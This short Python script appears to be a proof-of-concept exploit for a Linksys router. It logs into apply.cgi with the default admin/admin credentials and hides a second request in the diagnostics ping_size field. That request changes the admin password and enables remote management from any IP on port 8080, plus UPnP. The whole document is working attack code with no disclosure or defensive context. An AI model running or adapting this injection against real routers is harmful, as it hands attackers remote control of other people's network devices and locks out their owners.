import requests

# target IP address - default for LinkSys
target = "192.168.1.1"
port = 80

# username and password are not validated
username = "admin"
password = "admin"

cmd = "Management&change_action=&action=Apply&PasswdModify=1&http_enable=1&https_enable=0&ctm404_enable=&remote_mgt_https=0&wait_time=4&need_reboot=0&http_passwd=hello&http_passwdConfirm=hello&_http_enable=1&web_wl_filter=0&remote_management=1&_remote_mgt_https=1&remote_upgrade=0&remote_ip_any=1&http_wanport=8080&nf_alg_sip=0&upnp_enable=1&upnp_config=1&upnp_internet_dis=0"

data = {
    "submit_button": "Diagnostics",
    "change_action": "gozila_cgi",
    "submit_type": "start_ping",
    "action": "",
    "commit": "0",
    "ping_ip": "127.0.0.1",
    "ping_size": "&" + cmd, # Inject CMD through ping size since ping size not validated  
    "ping_times": "5",
    "traceroute_ip": "127.0.0.1"
}

timeout = 30.0
verify = False
allow_redirects = False

url = f"http://{target}:{port}/apply.cgi"

response = requests.post(url, data = data, auth = (username, password), timeout = timeout, verify = verify, allow_redirects = allow_redirects)

print(response.text)
